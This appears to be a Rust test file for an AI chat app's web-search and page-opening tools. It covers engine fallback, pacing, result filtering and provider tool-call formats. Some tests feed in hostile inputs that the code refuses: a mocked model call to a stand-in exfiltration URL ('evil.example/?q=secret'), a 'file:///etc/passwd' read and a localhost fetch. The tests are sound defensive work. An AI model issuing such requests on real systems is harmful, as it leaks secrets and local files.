use std::cell::RefCell;
use std::sync::Arc;

use super::*;
use crate::features::ask_ai::{Pending, Reply, anthropic, mock, openai};
use crate::shared::config::Provider;

fn hit(n: &str) -> Hit {
    Hit {
        title: format!("Page {n}"),
        url: format!("https://example.org/{n}"),
        snippet: String::new(),
    }
}

const fn engine(name: &'static str, url: fn(&str) -> String) -> Engine {
    Engine {
        name,
        url,
        form: |_| None,
        parse: |_, body| match body {
            "results" => vec![hit("1"), hit("2")],
            _ => Vec::new(),
        },
        blocked,
        gap: Duration::ZERO,
    }
}

/// A captcha page or a 429 rests that engine (it is not asked again) and the
/// next one answers; nothing answers = `None`.
#[test]
fn a_blocked_engine_rests_and_the_next_answers() {
    let engines = [
        engine("test-captcha", |_| "https://a/".into()),
        engine("test-429", |_| "https://b/".into()),
        engine("test-ok", |_| "https://c/".into()),
    ];
    let asked = RefCell::new(Vec::new());
    let get = |url: &str, _: Option<&str>| {
        asked.borrow_mut().push(url.to_string());
        Ok(match url {
            "https://a/" => (200, "<p>Please solve this CAPTCHA</p>".to_string()),
            "https://b/" => (429, String::new()),
            _ => (200, "results".to_string()),
        })
    };
    assert_eq!(
        search_with(&engines, "q", get),
        Some(vec![hit("1"), hit("2")])
    );
    assert_eq!(
        search_with(&engines, "q", get),
        Some(vec![hit("1"), hit("2")])
    );
    assert_eq!(
        *asked.borrow(),
        ["https://a/", "https://b/", "https://c/", "https://c/"],
        "the blocked engines rest"
    );
    let down = [engine("test-down", |_| "https://d/".into())];
    assert_eq!(search_with(&down, "q", |_, _| Err("offline".into())), None);
    // a page without results is not a block (asked again next time), and not
    // "search unavailable" either: the engine answered, it found nothing
    let empty = [engine("test-empty", |_| "https://e/".into())];
    assert_eq!(
        search_with(&empty, "q", |_, _| Ok((200, "none".into()))),
        Some(vec![])
    );
    assert_eq!(
        search_with(&empty, "q", |_, _| Ok((200, "results".into()))).map(|h| h.len()),
        Some(2)
    );
}

/// Bing's real page for a person's name (2026-11-18) had 10 results, one of
/// them a login page whose snippet said "Captcha text cannot be empty": a
/// page WITH results is never a block (the engine kept answering).
#[test]
fn a_result_that_mentions_captcha_is_not_a_block() {
    let engines = [engine("test-name", |_| "https://n/".into())];
    let asked = RefCell::new(0);
    let get = |_: &str, _: Option<&str>| {
        *asked.borrow_mut() += 1;
        Ok((200, "results".to_string()))
    };
    let engines_captcha = [Engine {
        parse: |_, body| match body.contains("results") {
            true => vec![hit("1")],
            false => vec![],
        },
        ..engines[0]
    }];
    let page = |_: &str, _: Option<&str>| {
        *asked.borrow_mut() += 1;
        Ok((
            200,
            "results <p>Captcha text cannot be empty.</p>".to_string(),
        ))
    };
    for _ in 0..2 {
        assert_eq!(
            search_with(&engines_captcha, "q", page),
            Some(vec![hit("1")])
        );
    }
    assert_eq!(search_with(&engines, "q", get).map(|h| h.len()), Some(2));
    assert_eq!(*asked.borrow(), 3, "never rested");
}

/// A paced engine (DuckDuckGo: 2 s) is asked one request at a time across
/// threads, the next one starting at least `gap` after the last ended.
#[test]
fn paced_requests_go_one_at_a_time_and_apart() {
    let paced = [Engine {
        gap: Duration::from_millis(150),
        ..engine("test-paced", |_| "https://p/".into())
    }];
    let spans = Arc::new(Mutex::new(Vec::new()));
    std::thread::scope(|s| {
        for _ in 0..2 {
            let spans = spans.clone();
            let paced = &paced;
            s.spawn(move || {
                search_with(paced, "q", |_, _| {
                    let start = Instant::now();
                    std::thread::sleep(Duration::from_millis(30));
                    spans.lock().unwrap().push((start, Instant::now()));
                    Ok((200, "results".into()))
                })
            });
        }
    });
    let mut spans = spans.lock().unwrap().clone();
    spans.sort();
    assert_eq!(spans.len(), 2);
    let apart = spans[1].0.duration_since(spans[0].1);
    assert!(apart >= Duration::from_millis(150), "{apart:?}");
}

/// DuckDuckGo's empty (throttled) or anomaly page rests it 15 min and
/// Wikipedia answers; "No results found" is an answer, not a block.
#[test]
fn an_empty_duckduckgo_page_rests_it() {
    let pair = [
        Engine {
            name: "test-ddg-empty",
            gap: Duration::ZERO,
            ..duckduckgo::ENGINE
        },
        engine("test-wiki", |_| "https://w/".into()),
    ];
    let asked = RefCell::new(Vec::new());
    let get = |url: &str, form: Option<&str>| {
        asked.borrow_mut().push(form.is_some());
        Ok(match url {
            "https://w/" => (200, "results".to_string()),
            _ => (
                200,
                "<html><body><!-- Web results are present --></body></html>".into(),
            ),
        })
    };
    for _ in 0..2 {
        assert_eq!(search_with(&pair, "q", get).map(|h| h.len()), Some(2));
    }
    assert_eq!(*asked.borrow(), [true, false, false], "DuckDuckGo rests");
    let none = [Engine {
        name: "test-ddg-none",
        gap: Duration::ZERO,
        ..duckduckgo::ENGINE
    }];
    for _ in 0..2 {
        let page = |_: &str, _: Option<&str>| Ok((200, "<h1>No results found for x</h1>".into()));
        assert_eq!(search_with(&none, "q", page), Some(vec![]), "not resting");
    }
}

fn call(id: &str, name: &str, args: &str) -> String {
    let args = serde_json::to_string(args).unwrap();
    format!(
        "data: {{\"choices\":[{{\"index\":0,\"delta\":{{\"tool_calls\":[{{\"index\":0,\"id\":\"{id}\",\"type\":\"function\",\"function\":{{\"name\":\"{name}\",\"arguments\":{args}}}}}]}}}}]}}\n\n\
         data: {{\"choices\":[{{\"index\":0,\"delta\":{{}},\"finish_reason\":\"tool_calls\"}}]}}\n\ndata: [DONE]\n\n"
    )
}

fn text(t: &str) -> String {
    format!(
        "data: {{\"choices\":[{{\"index\":0,\"delta\":{{\"content\":\"{t}\"}}}}]}}\n\ndata: [DONE]\n\n"
    )
}

fn cfg(url: String) -> AiConfig {
    AiConfig {
        provider: Provider::OpenaiCompatible,
        base_url: url,
        model: "m".into(),
        ..AiConfig::default()
    }
}

/// The model searches, opens a result, is refused a URL it made up, then
/// answers; the chat gets the sources. Only the search words leave.
#[test]
fn the_model_searches_opens_a_result_and_answers() {
    let (url, heads) = mock::serve(vec![
        mock::stream(&call("c1", "web_search", r#"{"query":"rust 2026"}"#)),
        mock::stream(&call(
            "c2",
            "open_page",
            r#"{"url":"https://example.org/1"}"#,
        )),
        mock::stream(&call(
            "c3",
            "open_page",
            r#"{"url":"https://evil.example/?q=secret"}"#,
        )),
        mock::stream(&text("Done [1]")),
    ]);
    let (searched, opened, web) = (
        RefCell::new(vec![]),
        RefCell::new(vec![]),
        RefCell::new(vec![]),
    );
    let mut answer_text = String::new();
    let question = [Message::user("What's new in Rust?").with_image(b"png".to_vec())];
    answer(
        &cfg(url),
        None,
        &question,
        |p| {
            answer_text.push_str(p);
            ControlFlow::Continue(())
        },
        |w| web.borrow_mut().push(w),
        |q| {
            searched.borrow_mut().push(q.to_string());
            Some(vec![hit("1")])
        },
        |u| {
            opened.borrow_mut().push(u.to_string());
            Ok("page text".into())
        },
    )
    .unwrap();
    assert_eq!(answer_text, "Done [1]");
    assert_eq!(*searched.borrow(), ["rust 2026"]);
    assert_eq!(
        *opened.borrow(),
        ["https://example.org/1"],
        "the made-up URL is refused"
    );
    assert_eq!(*web.borrow(), [Web::Sources(vec![hit("1")])]);
    assert_eq!(heads.try_iter().count(), 4);
}

/// A server that refuses tools (a model without tool calling): one search
/// with the question, its results go with it; search down = the note.
#[test]
fn a_model_without_tools_gets_one_search_with_the_question() {
    for (found, want) in [
        (Some(vec![hit("1")]), Web::Sources(vec![hit("1")])),
        (None, Web::Unavailable),
    ] {
        let (url, _) = mock::serve(vec![
            mock::reply(
                404,
                r#"{"error":{"message":"No endpoints found that support tool use"}}"#,
            ),
            mock::stream(&text("Answer [1]")),
        ]);
        let (searched, web) = (RefCell::new(vec![]), RefCell::new(vec![]));
        answer(
            &cfg(url),
            None,
            &[Message::user("weather tomorrow")],
            |_| ControlFlow::Continue(()),
            |w| web.borrow_mut().push(w),
            |q| {
                searched.borrow_mut().push(q.to_string());
                found.clone()
            },
            |_| unreachable!("no page without tools"),
        )
        .unwrap();
        assert_eq!(*searched.borrow(), ["weather tomorrow"]);
        assert_eq!(*web.borrow(), [want]);
    }
}

/// Gemini (OpenAI-compatible): a thinking model's tool call carries
/// `extra_content.google.thought_signature`; the next round must send it back
/// unchanged, or Google answers HTTP 400 (owner, 2026-11-18).
#[test]
fn gemini_gets_its_thought_signature_back() {
    let signed = r#"data: {"choices":[{"index":0,"delta":{"role":"assistant","tool_calls":[{"extra_content":{"google":{"thought_signature":"SIG=="}},"function":{"arguments":"{\"query\":\"amer\"}","name":"web_search"},"id":"g1","type":"function"}]},"finish_reason":"tool_calls"}]}

data: [DONE]

"#;
    let (url, seen) = mock::serve(vec![mock::stream(signed), mock::stream(&text("Found"))]);
    let mut got = String::new();
    answer(
        &cfg(url),
        None,
        &[Message::user("look for amer")],
        |p| {
            got.push_str(p);
            ControlFlow::Continue(())
        },
        |_| {},
        |_| Some(vec![hit("1")]),
        |_| Err("no".into()),
    )
    .unwrap();
    assert_eq!(got, "Found");
    let second = seen.try_iter().nth(1).unwrap();
    let body: Value = serde_json::from_str(second.split("\r\n\r\n").nth(1).unwrap()).unwrap();
    let echoed = &body["messages"]
        .as_array()
        .unwrap()
        .iter()
        .rev()
        .nth(1)
        .unwrap()["tool_calls"][0];
    assert_eq!(
        echoed["extra_content"],
        json!({"google": {"thought_signature": "SIG=="}})
    );
    assert_eq!(echoed["id"], "g1");
}

/// A provider that still refuses a later tool round (HTTP 400) gets the
/// no-tools path once (one search with the question), not an error card.
#[test]
fn a_refused_tool_round_falls_back_to_one_search() {
    let (url, _) = mock::serve(vec![
        mock::stream(&call("c1", "web_search", r#"{"query":"x"}"#)),
        mock::reply(
            400,
            r#"{"error":{"message":"Function call is missing a thought_signature"}}"#,
        ),
        mock::stream(&text("Answer")),
    ]);
    let (searched, mut got) = (RefCell::new(vec![]), String::new());
    answer(
        &cfg(url),
        None,
        &[Message::user("look for amer")],
        |p| {
            got.push_str(p);
            ControlFlow::Continue(())
        },
        |_| {},
        |q| {
            searched.borrow_mut().push(q.to_string());
            Some(vec![hit("1")])
        },
        |_| Err("no".into()),
    )
    .unwrap();
    assert_eq!(got, "Answer");
    assert_eq!(*searched.borrow(), ["x", "look for amer"]);
}

/// One turn with web search on, as the chat runs it: the answer text, the
/// result, the web notes and every request body the server got.
fn turn(
    replies: Vec<String>,
    found: Option<Vec<Hit>>,
) -> (String, Result<(), AiError>, Vec<Web>, Vec<Value>) {
    let (url, seen) = mock::serve(replies);
    let (mut got, web) = (String::new(), RefCell::new(vec![]));
    let done = answer(
        &cfg(url),
        None,
        &[Message::user("who is amer alreyahi")],
        |p| {
            got.push_str(p);
            ControlFlow::Continue(())
        },
        |w| web.borrow_mut().push(w),
        |_| found.clone(),
        |_| Err("no".into()),
    );
    let bodies = (seen.try_iter())
        .map(|r| serde_json::from_str(r.split("\r\n\r\n").nth(1).unwrap()).unwrap())
        .collect();
    (got, done, web.into_inner(), bodies)
}

/// The system note right before the question in a request body.
fn note(body: &Value) -> String {
    let msgs = body["messages"].as_array().unwrap();
    msgs[msgs.len() - 2]["content"]
        .as_str()
        .unwrap_or_default()
        .to_string()
}

/// Owner, 2026-11-18 (Gemini flash lite, "who is amer alreyahi"): the turn
/// stayed empty. A turn never ends empty: when the search finds nothing and
/// the model keeps searching until the rounds run out, or says nothing after
/// a search, it is asked once more WITHOUT tools, told the web had nothing.
#[test]
fn nothing_found_still_gets_an_answer() {
    let signed = r#"data: {"choices":[{"index":0,"delta":{"role":"assistant","tool_calls":[{"extra_content":{"google":{"thought_signature":"SIG=="}},"function":{"arguments":"{\"query\":\"amer\"}","name":"web_search"},"id":"g1","type":"function"}]},"finish_reason":"tool_calls"}]}

data: [DONE]

"#;
    let empty = "data: {\"choices\":[{\"index\":0,\"delta\":{},\"finish_reason\":\"stop\"}]}\n\ndata: [DONE]\n\n";
    // the model keeps searching: the rounds run out
    let mut searching: Vec<String> = (0..=ROUNDS)
        .map(|i| mock::stream(&call(&format!("c{i}"), "web_search", r#"{"query":"amer"}"#)))
        .collect();
    searching.push(mock::stream(&text("The web had nothing relevant.")));
    // Gemini-like: a signed call, then an empty reply
    let silent = vec![
        mock::stream(signed),
        mock::stream(empty),
        mock::stream(&text("The web had nothing relevant.")),
    ];
    for replies in [searching, silent] {
        let n = replies.len();
        let (got, done, web, bodies) = turn(replies, Some(vec![]));
        done.unwrap();
        assert_eq!(got, "The web had nothing relevant.");
        assert!(web.is_empty(), "{web:?}");
        assert_eq!(bodies.len(), n);
        let last = bodies.last().unwrap();
        assert!(last.get("tools").is_none(), "the last ask has no tools");
        assert_eq!(note(last), NOTHING);
    }
}

/// Search down, then the model says nothing: it answers without tools with
/// the "search is down" note.
#[test]
fn search_down_still_gets_an_answer() {
    let (got, done, web, bodies) = turn(
        vec![
            mock::stream(&call("c1", "web_search", r#"{"query":"x"}"#)),
            mock::stream(&text("")),
            mock::stream(&text("I could not search the web.")),
        ],
        None,
    );
    done.unwrap();
    assert_eq!(got, "I could not search the web.");
    assert_eq!(web, [Web::Unavailable]);
    assert_eq!(note(&bodies[2]), DOWN);
}

/// A later tool round that fails (not a 400: that one searches once) is
/// answered without tools with what search found, not an error card.
#[test]
fn a_failed_tool_round_answers_without_tools() {
    let (got, done, web, bodies) = turn(
        vec![
            mock::stream(&call("c1", "web_search", r#"{"query":"x"}"#)),
            mock::reply(422, r#"{"error":{"message":"bad turn"}}"#),
            mock::stream(&text("Amer [1]")),
        ],
        Some(vec![hit("1")]),
    );
    done.unwrap();
    assert_eq!(got, "Amer [1]");
    assert_eq!(web, [Web::Sources(vec![hit("1")])]);
    assert!(note(&bodies[2]).contains("https://example.org/1"));
}

/// The no-tools path (a refused round) when search finds nothing: the
/// "nothing relevant" note (not "try other words": there are no tools).
/// The model itself saying nothing = the error card (with Retry).
#[test]
fn an_empty_answer_is_an_error_with_retry() {
    let (_, done, _, bodies) = turn(
        vec![
            mock::reply(
                404,
                r#"{"error":{"message":"No endpoints found that support tool use"}}"#,
            ),
            mock::stream(&text("")),
        ],
        Some(vec![]),
    );
    assert_eq!(note(&bodies[1]), NOTHING);
    let e = done.unwrap_err();
    assert!(matches!(e, AiError::Empty), "{e:?}");
    assert_eq!(e.fix(), Some(crate::features::ask_ai::Fix::Retry));
    // after a search: the plain ask empty too
    let (_, done, _, _) = turn(
        vec![
            mock::stream(&call("c1", "web_search", r#"{"query":"x"}"#)),
            mock::stream(&text("")),
            mock::stream(&text("")),
        ],
        Some(vec![]),
    );
    assert!(matches!(done, Err(AiError::Empty)), "{done:?}");
}

/// The owner's search (2026-11-18): Bing mixed Chinese Outlook pages and
/// pages without the name into an English name's results; only the pages
/// about the name in its script reach the model, from any engine.
#[test]
fn results_off_the_query_or_in_another_script_are_dropped() {
    let result = |href: &str, title: &str, snippet: &str| {
        format!(
            r#"<tr><td><a rel="nofollow" href="{href}" class='result-link'>{title}</a></td></tr><tr><td class='result-snippet'>{snippet}</td></tr>"#
        )
    };
    let page = [
        result(
            "https://zhihu.com/q/1",
            "Outlook 邮箱怎么登录 - 知乎",
            "Amer 微软 Outlook 登录问题",
        ),
        result(
            "https://gov.example/",
            "Ministry portal",
            "Official services and forms",
        ),
        result(
            "https://github.com/AmerAlreyahi",
            "Amer Alreyahi - GitHub",
            "OpenCircle author",
        ),
        result("https://baidu.com/x", "百度一下", "你就知道"),
    ]
    .concat();
    let asked = RefCell::new(String::new());
    let ddg = [Engine {
        name: "test-ddg-filter",
        gap: Duration::ZERO,
        ..duckduckgo::ENGINE
    }];
    let hits = search_with(&ddg, "search for Amer Alreyahi", |_, form| {
        *asked.borrow_mut() = form.unwrap_or_default().to_string();
        Ok((200, page.clone()))
    })
    .unwrap();
    assert_eq!(hits.len(), 1, "{hits:?}");
    assert_eq!(hits[0].url, "https://github.com/AmerAlreyahi");
    assert!(asked.borrow().ends_with("kl=us-en"), "{}", asked.borrow());
    // Arabic keeps Arabic pages
    let ar = |t: &str| Hit {
        title: t.into(),
        url: "https://ar.example/".into(),
        snippet: String::new(),
    };
    let kept = relevant(
        "عاصمة اليابان",
        vec![ar("طوكيو عاصمة اليابان"), ar("Tokyo")],
    );
    assert_eq!(kept, [ar("طوكيو عاصمة اليابان")]);
}

/// Under the answer: only the results it used (a page it opened, a result
/// it cited by number), not every result it was given.
#[test]
fn the_sources_are_only_the_pages_the_answer_used() {
    let (url, _) = mock::serve(vec![
        mock::stream(&call("c1", "web_search", r#"{"query":"q"}"#)),
        mock::stream(&call(
            "c2",
            "open_page",
            r#"{"url":"https://example.org/3"}"#,
        )),
        mock::stream(&text("See [2].")),
    ]);
    let web = RefCell::new(vec![]);
    answer(
        &cfg(url),
        None,
        &[Message::user("q")],
        |_| ControlFlow::Continue(()),
        |w| web.borrow_mut().push(w),
        |_| Some(vec![hit("1"), hit("2"), hit("3"), hit("4")]),
        |_| Ok("text".into()),
    )
    .unwrap();
    assert_eq!(*web.borrow(), [Web::Sources(vec![hit("2"), hit("3")])]);
}

#[test]
fn the_user_s_own_links_may_be_opened() {
    assert_eq!(
        links("Summarize (https://example.org/a), not file:///etc/passwd or ftp://x"),
        ["https://example.org/a"]
    );
}

/// OpenAI: the assistant turn with its calls, then one `tool` message per result.
#[test]
fn openai_sends_tool_turns_back_in_its_format() {
    let mut pending = Pending::default();
    for line in call("c1", "web_search", r#"{"query":"x"}"#)
        .lines()
        .filter_map(|l| l.strip_prefix("data: "))
    {
        openai::parse_into(line, &mut pending).unwrap();
    }
    let Reply { calls, native, .. } = openai::reply(String::new(), pending);
    assert_eq!(
        (
            calls[0].id.as_str(),
            calls[0].name.as_str(),
            calls[0].args.as_str()
        ),
        ("c1", "web_search", r#"{"query":"x"}"#)
    );
    let mut called = Message::new(Role::Assistant, "");
    called.native = native;
    let mut back = Message::user("");
    back.results = vec![("c1".into(), "results".into())];
    let req = openai::build_request(
        &cfg("https://x/v1".into()),
        None,
        &[Message::user("q"), called, back],
        None,
    )
    .unwrap();
    let msgs = &req.body["messages"];
    assert_eq!(msgs[1]["tool_calls"][0]["function"]["name"], "web_search");
    assert_eq!(msgs[1]["content"], Value::Null);
    assert_eq!(
        msgs[2],
        json!({"role": "tool", "tool_call_id": "c1", "content": "results"})
    );
}

/// Anthropic: every block of the assistant turn goes back as it came (the
/// thinking block with its signature), all results in one user message.
#[test]
fn anthropic_sends_thinking_and_tool_use_back_unchanged() {
    let events = [
        r#"{"type":"content_block_start","index":0,"content_block":{"type":"thinking","thinking":"","signature":""}}"#,
        r#"{"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"Let me search"}}"#,
        r#"{"type":"content_block_delta","index":0,"delta":{"type":"signature_delta","signature":"SIG"}}"#,
        r#"{"type":"content_block_stop","index":0}"#,
        r#"{"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"t1","name":"web_search","input":{}}}"#,
        r#"{"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\"query\":"}}"#,
        r#"{"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"\"x\"}"}}"#,
        r#"{"type":"content_block_stop","index":1}"#,
        r#"{"type":"content_block_start","index":2,"content_block":{"type":"tool_use","id":"t2","name":"web_search","input":{}}}"#,
        r#"{"type":"content_block_stop","index":2}"#,
    ];
    let mut pending = Pending::default();
    for e in events {
        anthropic::parse_into(e, &mut pending).unwrap();
    }
    let Reply { calls, native, .. } = anthropic::reply(String::new(), pending);
    assert_eq!(calls.len(), 2);
    assert_eq!(calls[0].args, r#"{"query":"x"}"#);
    let blocks = native.clone().unwrap();
    assert_eq!(
        blocks[0],
        json!({"type": "thinking", "thinking": "Let me search", "signature": "SIG"})
    );
    assert_eq!(
        blocks[1],
        json!({"type": "tool_use", "id": "t1", "name": "web_search", "input": {"query": "x"}})
    );
    assert_eq!(blocks[2]["input"], json!({}));
    let mut called = Message::new(Role::Assistant, "");
    called.native = native;
    let mut back = Message::user("");
    back.results = vec![("t1".into(), "a".into()), ("t2".into(), "b".into())];
    let key = crate::shared::secrets::Secret::new("sk-ant-FAKE");
    let req = anthropic::build_request(
        &AiConfig::default(),
        Some(&key),
        &[Message::user("q"), called, back],
        None,
    )
    .unwrap();
    let msgs = req.body["messages"].as_array().unwrap();
    assert_eq!(msgs.len(), 3);
    assert_eq!(msgs[1]["content"], blocks);
    assert_eq!(
        msgs[2]["content"][1],
        json!({"type": "tool_result", "tool_use_id": "t2", "content": "b"})
    );
}

#[test]
fn page_text_drops_scripts_and_tags() {
    let html = "<html><head><title>T</title><style>p{}</style></head><body><script>x=1<2</script>\
                <h1>Title &amp; more</h1><p>One&nbsp;two&#33;</p><div>three<br>four</div></body></html>";
    assert_eq!(page::text_of(html), "Title & more\nOne two!\nthree\nfour");
    assert!(page::open("file:///etc/passwd").is_err());
}

/// The real engines and a real page, from this PC (network; by hand:
/// `cargo test live_search -- --ignored --nocapture`).
#[test]
#[ignore]
fn live_search_and_page() {
    // the owner's queries (W59): no Chinese / off-topic pages left; DuckDuckGo
    // answers each (paced 2 s apart), Wikipedia only if it rests
    for q in [
        "ubuntu 22.04 end of life",
        "عاصمة اليابان",
        "Amer Alreyahi",
        "search for Amer Alreyahi",
        "Linus Torvalds",
    ] {
        let hits = search(q).expect("an engine answers");
        println!("{q}: {} hits", hits.len());
        for h in &hits {
            println!("  {} | {}", h.title, h.url);
        }
        assert!(hits.iter().all(|h| h.url.starts_with("https://")));
    }
    let wiki = search_with(&ENGINES[1..], "Rust programming language", |u, _| {
        let agent = crate::shared::net::agent(crate::shared::net::WEB);
        let mut r = agent.get(u).call().map_err(|e| e.to_string())?;
        let body = r.body_mut().read_to_string().map_err(|e| e.to_string())?;
        Ok((r.status().as_u16(), body))
    })
    .expect("Wikipedia answers");
    let text = page::open(&wiki[0].url).expect("the page opens");
    let head: String = text.chars().take(200).collect();
    println!("{} -> {} chars: {head}", wiki[0].url, text.len());
    assert!(text.len() > 500);
    assert!(page::open("http://127.0.0.1/").is_err());
}
